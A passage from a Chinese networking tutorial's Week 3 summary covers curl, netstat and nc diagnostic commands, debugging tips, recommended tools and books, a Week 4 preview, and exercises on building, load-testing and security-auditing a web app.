class="hljs-comment">//example.com/api</span><br><br>HTTPS请求：<br>curl -k https:<span class="hljs-comment">//localhost:8443</span><br><br>跟随重定向：<br>curl -L http:<span class="hljs-comment">//example.com</span><br><br>显示详细信息：<br>curl -v http:<span class="hljs-comment">//example.com</span><br><br>测试速度：<br>curl -w <span class="hljs-string">&quot;@curl-format.txt&quot;</span> -o /<span class="hljs-built_in">dev</span>/<span class="hljs-built_in">null</span> -s http:<span class="hljs-comment">//example.com</span><br></code></pre></td></tr></table></figure><p><strong>netstat &#x2F; ss</strong>：</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">查看所有连接：<br>netstat -<span class="hljs-keyword">an</span><br>ss -<span class="hljs-keyword">an</span><br><br>查看监听端口：<br>netstat -lntp<br>ss -lntp<br><br>查看TCP连接：<br>netstat -nt<br>ss -nt<br><br>查看连接数量：<br>netstat -<span class="hljs-keyword">an</span> | grep ESTABLISHED | wc -l<br>ss -s<br><br>查看某端口连接：<br>netstat -<span class="hljs-keyword">an</span> | grep :<span class="hljs-number">80</span><br>ss -<span class="hljs-built_in">tan</span> | grep :<span class="hljs-number">80</span><br></code></pre></td></tr></table></figure><p><strong>telnet &#x2F; nc</strong>：</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs maxima">测试端口：<br>telnet <span class="hljs-built_in">example</span>.com <span class="hljs-number">80</span><br>nc -zv <span class="hljs-built_in">example</span>.com <span class="hljs-number">80</span><br><br>发送HTTP请求：<br>telnet <span class="hljs-built_in">example</span>.com <span class="hljs-number">80</span><br>GET / HTTP/<span class="hljs-number">1.1</span><br>Host: <span class="hljs-built_in">example</span>.com<br>[空行]<br><br>监听端口：<br>nc -l <span class="hljs-number">8080</span><br><br>端口转发：<br>nc -l <span class="hljs-number">8080</span> | nc <span class="hljs-built_in">example</span>.com <span class="hljs-number">80</span><br></code></pre></td></tr></table></figure><h3 id="4-3-调试技巧"><a href="#4-3-调试技巧" class="headerlink" title="4.3 调试技巧"></a>4.3 调试技巧</h3><p><strong>日志分析</strong>：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs routeros">日志级别：<br><span class="hljs-built_in">DEBUG</span> &lt; <span class="hljs-built_in">INFO</span> &lt; <span class="hljs-built_in">WARNING</span> &lt; <span class="hljs-built_in">ERROR</span> &lt; CRITICAL<br><br>日志内容：<br>- 时间戳<br>- 级别<br>- 模块<br>- 消息<br>- 异常堆栈<br><br>示例：<br>[2024-01-15 10:30:45] <span class="hljs-built_in">INFO</span> [server]<span class="hljs-built_in"> Client </span>connected: 192.168.1.100:54321<br>[2024-01-15 10:30:45] <span class="hljs-built_in">DEBUG</span> [handler] Request: <span class="hljs-built_in">GET</span> /api<span class="hljs-built_in">/users</span><br><span class="hljs-built_in"></span>[2024-01-15 10:30:46] <span class="hljs-built_in">ERROR</span> [database]<span class="hljs-built_in"> Connection </span>failed: timeout<br></code></pre></td></tr></table></figure><p><strong>性能分析</strong>：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs vim">Python profiling：<br><span class="hljs-keyword">python</span> -<span class="hljs-keyword">m</span> cProfile -<span class="hljs-keyword">o</span> <span class="hljs-keyword">profile</span>.out script.<span class="hljs-keyword">py</span><br><span class="hljs-keyword">python</span> -<span class="hljs-keyword">m</span> pstats <span class="hljs-keyword">profile</span>.out<br><br>内存分析：<br>memory_profiler<br>objgraph<br><br>网络性能：<br>ping - 测试延迟<br>traceroute - 追踪路由<br>iperf - 测试带宽<br><span class="hljs-keyword">ab</span> - HTTP压力测试<br>wrk - 现代化压力测试<br></code></pre></td></tr></table></figure><p><strong>常见问题排查</strong>：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">连接被拒绝：<br><span class="hljs-bullet">- </span>检查服务是否启动<br><span class="hljs-bullet">- </span>检查端口是否正确<br><span class="hljs-bullet">- </span>检查防火墙规则<br><br>连接超时：<br><span class="hljs-bullet">- </span>检查网络连通性<br><span class="hljs-bullet">- </span>检查路由<br><span class="hljs-bullet">- </span>检查防火墙<br><br>连接重置：<br><span class="hljs-bullet">- </span>服务器主动关闭<br><span class="hljs-bullet">- </span>防火墙拦截<br><span class="hljs-bullet">- </span>代理问题<br><br>慢查询：<br><span class="hljs-bullet">- </span>网络延迟高<br><span class="hljs-bullet">- </span>服务器负载高<br><span class="hljs-bullet">- </span>数据库慢查询<br><span class="hljs-bullet">- </span>锁竞争<br><br>内存泄漏：<br><span class="hljs-bullet">- </span>使用内存分析工具<br><span class="hljs-bullet">- </span>检查循环引用<br><span class="hljs-bullet">- </span>检查资源释放<br></code></pre></td></tr></table></figure><hr><h2 id="5-工具和资源推荐"><a href="#5-工具和资源推荐" class="headerlink" title="5. 工具和资源推荐"></a>5. 工具和资源推荐</h2><h3 id="5-1-开发工具"><a href="#5-1-开发工具" class="headerlink" title="5.1 开发工具"></a>5.1 开发工具</h3><p><strong>代码编辑器</strong>：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs markdown">VS Code：<br><span class="hljs-bullet">-</span> 免费开源<br><span class="hljs-bullet">-</span> 插件丰富<br><span class="hljs-bullet">-</span> 推荐插件：<br><span class="hljs-bullet">  -</span> Python<br><span class="hljs-bullet">  -</span> Remote SSH<br><span class="hljs-bullet">  -</span> REST Client<br><span class="hljs-bullet">  -</span> GitLens<br><br>PyCharm：<br><span class="hljs-bullet">-</span> 专业Python IDE<br><span class="hljs-bullet">-</span> 强大的调试功能<br><span class="hljs-bullet">-</span> 数据库工具<br><br>Vim：<br><span class="hljs-bullet">-</span> 轻量级<br><span class="hljs-bullet">-</span> 高效编辑<br><span class="hljs-bullet">-</span> 服务器必备<br></code></pre></td></tr></table></figure><p><strong>API测试工具</strong>：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">Postman：<br><span class="hljs-bullet">- </span>功能强大<br><span class="hljs-bullet">- </span>团队协作<br><span class="hljs-bullet">- </span>自动化测试<br><br>Insomnia：<br><span class="hljs-bullet">- </span>简洁界面<br><span class="hljs-bullet">- </span>支持GraphQL<br><span class="hljs-bullet">- </span>开源<br><br>curl：<br><span class="hljs-bullet">- </span>命令行<br><span class="hljs-bullet">- </span>脚本友好<br><span class="hljs-bullet">- </span>通用性强<br><br>httpie：<br><span class="hljs-bullet">- </span>用户友好<br><span class="hljs-bullet">- </span>彩色输出<br><span class="hljs-bullet">- </span>简单语法<br></code></pre></td></tr></table></figure><p><strong>网络工具</strong>：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs vim">Wireshark：包分析<br>tcpdump：抓包<br><span class="hljs-keyword">nmap</span>：端口扫描<br>netcat：网络调试<br>iperf：性能测试<br>mtr：路由追踪<br></code></pre></td></tr></table></figure><h3 id="5-2-学习资源"><a href="#5-2-学习资源" class="headerlink" title="5.2 学习资源"></a>5.2 学习资源</h3><p><strong>书籍推荐</strong>：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">网络协议：<br><span class="hljs-bullet">- </span>《TCP/IP详解 卷1》<br><span class="hljs-bullet">- </span>《计算机网络：自顶向下方法》<br><span class="hljs-bullet">- </span>《HTTP权威指南》<br><br>编程实践：<br><span class="hljs-bullet">- </span>《Unix网络编程》<br><span class="hljs-bullet">- </span>《高性能网络编程》<br><span class="hljs-bullet">- </span>《Web性能权威指南》<br><br>安全：<br><span class="hljs-bullet">- </span>《白帽子讲Web安全》<br><span class="hljs-bullet">- </span>《Web应用安全权威指南》<br><span class="hljs-bullet">- </span>《密码学原理与实践》<br></code></pre></td></tr></table></figure><p><strong>在线资源</strong>：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">文档：<br><span class="hljs-bullet">- </span>MDN Web Docs<br><span class="hljs-bullet">- </span>Python官方文档<br><span class="hljs-bullet">- </span>RFC文档<br><br>博客：<br><span class="hljs-bullet">- </span>High Scalability<br><span class="hljs-bullet">- </span>Cloudflare Blog<br><span class="hljs-bullet">- </span>Google Developers<br><br>视频：<br><span class="hljs-bullet">- </span>YouTube技术频道<br><span class="hljs-bullet">- </span>Bilibili技术区<br><span class="hljs-bullet">- </span>Udemy课程<br><br>实践：<br><span class="hljs-bullet">- </span>GitHub开源项目<br><span class="hljs-bullet">- </span>LeetCode<br><span class="hljs-bullet">- </span>CTF比赛<br></code></pre></td></tr></table></figure><p><strong>工具网站</strong>：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">测试工具：<br><span class="hljs-bullet">- </span>SSL Labs（SSL测试）<br><span class="hljs-bullet">- </span>WebPageTest（性能测试）<br><span class="hljs-bullet">- </span>GTmetrix（网站分析）<br><br>在线工具：<br><span class="hljs-bullet">- </span>regex101（正则测试）<br><span class="hljs-bullet">- </span>JSON Editor Online<br><span class="hljs-bullet">- </span>Base64编解码<br><br>监控服务：<br><span class="hljs-bullet">- </span>UptimeRobot<br><span class="hljs-bullet">- </span>Pingdom<br><span class="hljs-bullet">- </span>New Relic<br></code></pre></td></tr></table></figure><h3 id="5-3-开源项目学习"><a href="#5-3-开源项目学习" class="headerlink" title="5.3 开源项目学习"></a>5.3 开源项目学习</h3><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">Web服务器：<br><span class="hljs-bullet">- </span>Nginx（高性能HTTP服务器）<br><span class="hljs-bullet">- </span>Apache（传统Web服务器）<br><span class="hljs-bullet">- </span>Caddy（现代Web服务器）<br><br>框架：<br><span class="hljs-bullet">- </span>Flask（Python微框架）<br><span class="hljs-bullet">- </span>Django（Python全栈框架）<br><span class="hljs-bullet">- </span>Express（Node.js框架）<br><br>工具：<br><span class="hljs-bullet">- </span>curl（HTTP客户端）<br><span class="hljs-bullet">- </span>redis（内存数据库）<br><span class="hljs-bullet">- </span>PostgreSQL（关系数据库）<br></code></pre></td></tr></table></figure><hr><h2 id="6-本周总结"><a href="#6-本周总结" class="headerlink" title="6. 本周总结"></a>6. 本周总结</h2><h3 id="6-1-知识地图"><a href="#6-1-知识地图" class="headerlink" title="6.1 知识地图"></a>6.1 知识地图</h3><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs mathematica">第三周：传输层和应用层协议<br><br>传输层：<br>├─ <span class="hljs-variable">TCP</span>协议<br>│  ├─ 三次握手<br>│  ├─ 四次挥手<br>│  ├─ 可靠传输<br>│  ├─ 流量控制<br>│  └─ 拥塞控制<br>│<br>└─ <span class="hljs-variable">UDP</span>协议<br>   ├─ 无连接<br>   ├─ 不可靠<br>   └─ 快速<br><br>应用层：<br>├─ <span class="hljs-variable">HTTP</span>协议<br>│  ├─ 请求<span class="hljs-operator">/</span>响应<br>│  ├─ 方法<br>│  ├─ 状态码<br>│  └─ <span class="hljs-variable">Cookie</span><span class="hljs-operator">/</span><span class="hljs-variable">Session</span><br>│<br>└─ <span class="hljs-variable">HTTPS</span>协议<br>   ├─ <span class="hljs-variable">TLS</span><span class="hljs-operator">/</span><span class="hljs-variable">SSL</span><br>   ├─ 加密<br>   ├─ 证书<br>   └─ 安全<br><br>编程实践：<br>├─ <span class="hljs-built_in">Socket</span>编程<br>│  ├─ <span class="hljs-variable">TCP</span> <span class="hljs-built_in">Socket</span><br>│  ├─ <span class="hljs-variable">UDP</span> <span class="hljs-built_in">Socket</span><br>│  └─ <span class="hljs-variable">IO</span>多路复用<br>│<br>└─ <span class="hljs-variable">Web</span>开发<br>   ├─ <span class="hljs-variable">HTTP</span>服务器<br>   ├─ <span class="hljs-variable">HTTPS</span>服务器<br>   └─ 安全实践<br></code></pre></td></tr></table></figure><h3 id="6-2-核心要点"><a href="#6-2-核心要点" class="headerlink" title="6.2 核心要点"></a>6.2 核心要点</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs awk">TCP：<br>三次握手建立连接<br>四次挥手断开连接<br>通过序列号、ACK、重传保证可靠性<br>通过滑动窗口实现流量控制<br>通过拥塞控制算法避免网络拥塞<br><br>UDP：<br>无连接、不可靠、快速<br><span class="hljs-number">8</span>字节头部<br>适合实时应用<br>可以在应用层实现可靠性<br><br>HTTP：<br>请求 = 请求行 + 请求头 + 空行 + 请求体<br>响应 = 状态行 + 响应头 + 空行 + 响应体<br>无状态，通过Cookie/Session保持状态<br>HTTP<span class="hljs-regexp">/2多路复用，HTTP/</span><span class="hljs-number">3</span>基于QUIC<br><br>HTTPS：<br>HTTP + TLS/SSL<br>混合加密：RSA交换密钥 + AES加密数据<br>数字证书验证身份<br>TLS <span class="hljs-number">1.3</span>比TLS <span class="hljs-number">1.2</span>快一倍<br><br>Socket编程：<br>阻塞vs非阻塞<br>IO多路复用：select<span class="hljs-regexp">/poll/</span>epoll<br>epoll性能最好（Linux）<br>高性能服务器架构<br></code></pre></td></tr></table></figure><h3 id="6-3-实践技能"><a href="#6-3-实践技能" class="headerlink" title="6.3 实践技能"></a>6.3 实践技能</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs">已掌握：<br>✅ 分析TCP连接过程<br>✅ 理解TCP可靠性机制<br>✅ 使用UDP编程<br>✅ 实现IO多路复用<br>✅ 构建HTTP服务器<br>✅ 配置HTTPS服务器<br>✅ 生成SSL证书<br>✅ 实现安全认证<br>✅ 网络抓包分析<br>✅ 性能优化<br><br>待提升：<br>□ 大规模并发处理<br>□ 分布式系统<br>□ 负载均衡<br>□ 服务发现<br>□ 容器化部署<br></code></pre></td></tr></table></figure><hr><h2 id="7-下周预告"><a href="#7-下周预告" class="headerlink" title="7. 下周预告"></a>7. 下周预告</h2><p><strong>第四周：网络层协议（第22-28天）</strong></p><h3 id="第22天：IP协议基础"><a href="#第22天：IP协议基础" class="headerlink" title="第22天：IP协议基础"></a>第22天：IP协议基础</h3><ul><li>IPv4地址和子网划分</li><li>IP报文格式</li><li>IP路由原理</li><li>NAT技术</li></ul><h3 id="第23天：IPv6详解"><a href="#第23天：IPv6详解" class="headerlink" title="第23天：IPv6详解"></a>第23天：IPv6详解</h3><ul><li>IPv6地址格式</li><li>IPv6 vs IPv4</li><li>过渡技术</li><li>IPv6部署</li></ul><h3 id="第24天：ICMP和诊断工具"><a href="#第24天：ICMP和诊断工具" class="headerlink" title="第24天：ICMP和诊断工具"></a>第24天：ICMP和诊断工具</h3><ul><li>ICMP协议</li><li>ping原理</li><li>traceroute原理</li><li>网络诊断</li></ul><h3 id="第25天：ARP和链路层"><a href="#第25天：ARP和链路层" class="headerlink" title="第25天：ARP和链路层"></a>第25天：ARP和链路层</h3><ul><li>ARP协议</li><li>ARP缓存</li><li>ARP欺骗</li><li>链路层概述</li></ul><h3 id="第26天：路由协议"><a href="#第26天：路由协议" class="headerlink" title="第26天：路由协议"></a>第26天：路由协议</h3><ul><li>静态路由</li><li>动态路由</li><li>RIP、OSPF、BGP</li><li>路由表</li></ul><h3 id="第27天：网络安全进阶"><a href="#第27天：网络安全进阶" class="headerlink" title="第27天：网络安全进阶"></a>第27天：网络安全进阶</h3><ul><li>防火墙</li><li>VPN</li><li>IDS&#x2F;IPS</li><li>DDoS防护</li></ul><h3 id="第28天：第四周总结"><a href="#第28天：第四周总结" class="headerlink" title="第28天：第四周总结"></a>第28天：第四周总结</h3><ul><li>网络层知识回顾</li><li>路由器实现</li><li>网络安全实战</li></ul><hr><h2 id="8-今日练习"><a href="#8-今日练习" class="headerlink" title="8. 今日练习"></a>8. 今日练习</h2><h3 id="练习1：完成综合项目"><a href="#练习1：完成综合项目" class="headerlink" title="练习1：完成综合项目"></a>练习1：完成综合项目</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs markdown">基于本周所学知识，完成SecureWebApp项目：<br><br>必需功能：<br><span class="hljs-bullet">1.</span> HTTP和HTTPS服务器<br><span class="hljs-bullet">2.</span> 用户注册/登录<br><span class="hljs-bullet">3.</span> Session管理<br><span class="hljs-bullet">4.</span> RESTful API<br><span class="hljs-bullet">5.</span> 静态文件服务<br><span class="hljs-bullet">6.</span> 安全防护（CSRF、XSS）<br><br>加分项：<br><span class="hljs-bullet">1.</span> 多进程/线程池<br><span class="hljs-bullet">2.</span> 性能监控<br><span class="hljs-bullet">3.</span> 日志系统<br><span class="hljs-bullet">4.</span> 限流功能<br><span class="hljs-bullet">5.</span> WebSocket支持<br></code></pre></td></tr></table></figure><h3 id="练习2：性能测试"><a href="#练习2：性能测试" class="headerlink" title="练习2：性能测试"></a>练习2：性能测试</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs markdown">对你的服务器进行压力测试：<br><br>使用工具：<br><span class="hljs-bullet">-</span> ab（Apache Bench）<br><span class="hljs-bullet">-</span> wrk<br><span class="hljs-bullet">-</span> locust<br><br>测试场景：<br><span class="hljs-bullet">1.</span> 静态文件服务<br><span class="hljs-bullet">2.</span> API接口<br><span class="hljs-bullet">3.</span> 并发连接<br><span class="hljs-bullet">4.</span> 长连接<br><br>分析指标：<br><span class="hljs-bullet">-</span> QPS（每秒请求数）<br><span class="hljs-bullet">-</span> 响应时间<br><span class="hljs-bullet">-</span> 并发能力<br><span class="hljs-bullet">-</span> 错误率<br></code></pre></td></tr></table></figure><h3 id="练习3：安全审计"><a href="#练习3：安全审计" class="headerlink" title="练习3：安全审计"></a>练习3：安全审计</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs markdown">检查你的应用安全性：<br><br>检查项目：<br><span class="hljs-bullet">1.</span> HTTPS配置<br><span class="hljs-bullet">2.</span> 密码存储<br><span class="hljs-bullet">3.</span> Session安全<br><span class="hljs-bullet">4.</span> CSRF防护<br><span class="hljs-bullet">5.</span> XSS防护<br><span class="hljs-bullet">6.</span> SQL注入防护<br><span class="hljs-bullet">7.</span> 输入验证<br><span class="hljs-bullet">8.</span> 错误处理<br><br>使用工具：<br><span class="hljs-bullet">-</span> SSL Labs<br><span class="hljs-bullet">-</span> OWASP ZAP<br><span class="hljs-bullet">-</span> Burp Suite<br></code></pre></td></tr></table></figure><h3 id="练习4：网络分析"><a href="#练习4：网络分析" class="headerlink" title="练习4：网络分析"></a>练习4：网络分析</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs markdown">使用Wireshark分析：<br><br>任务：<br><span class="hljs-bullet">1.</span> 捕获HTTP通信<br><span class="hljs-bullet">2.</span> 分析TCP三次握手<br><span class="hljs-bullet">3.</span> 查看TLS握手过程<br><span class="hljs-bullet">4.</span> 识别加密流量<br><span class="hljs-bullet">5.</span> 分析DNS查询<br><span class="hljs-bullet">6.</span> 追踪完整会话<br><br>输出：<br><span class="hljs-bullet">-</span> 截图<br><span class="hljs-bullet">-</span> 分析报告<br><span class="hljs-bullet">-</span> 发现的问题<br></code></pre></td></tr></table></figure><hr><h2 id="9-总结"><a href="#9-总结" class="headerlink" title="9. 总结"></a>9. 总结</h2><p>恭喜你完成了第三周的学习！🎉</p><h3 id="本周成就"><a href="#本周成就" class="headerlink" title="本周成就"></a>本周成就</h3><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs mathematica">✅ 深入理解<span class="hljs-variable">TCP</span>和<span class="hljs-variable">UDP</span>协议<br>✅ 掌握<span class="hljs-built_in">Socket</span>编程技术<br>✅ 学会构建<span class="hljs-variable">HTTP</span><span class="hljs-operator">/</span><span class="hljs-variable">HTTPS</span>服务器<br>✅ 了解网络安全基础<br>✅ 实践性能优化<br>✅ 掌握调试和排错技巧<br><br>完成的实战项目：<br>✅ <span class="hljs-variable">TCP</span>连接分析器<br>✅ <span class="hljs-variable">UDP</span>聊天室<br>✅ 多人聊天服务器（<span class="hljs-variable">IO</span>多路复用）<br>✅ <span class="hljs-variable">HTTP</span>服务器<br>✅ <span class="hljs-variable">HTTPS</span>服务器<br>✅ 证书生成器<br>✅ 综合<span class="hljs-variable">Web</span>应用<br></code></pre></td></tr></table></figure><h3 id="学习建议"><a href="#学习建议" class="headerlink" title="学习建议"></a>学习建议</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> 动手实践<br><span class="hljs-bullet">   -</span> 理论要结合实践<br><span class="hljs-bullet">   -</span> 多写代码<br><span class="hljs-bullet">   -</span> 多做实验<br><br><span class="hljs-bullet">2.</span> 深入理解<br><span class="hljs-bullet">   -</span> 不要停留在表面<br><span class="hljs-bullet">   -</span> 思考为什么<br><span class="hljs-bullet">   -</span> 查看源代码<br><br><span class="hljs-bullet">3.</span> 系统学习<br><span class="hljs-bullet">   -</span> 从底层到应用层<br><span class="hljs-bullet">   -</span> 建立知识体系<br><span class="hljs-bullet">   -</span> 相互关联<br><br><span class="hljs-bullet">4.</span> 持续学习<br><span class="hljs-bullet">   -</span> 技术在演进<br><span class="hljs-bullet">   -</span> 保持好奇心<br><span class="hljs-bullet">   -</span> 关注新技术<br></code></pre></td></tr></table></figure><h3 id="下周准备"><a href="#下周准备" class="headerlink" 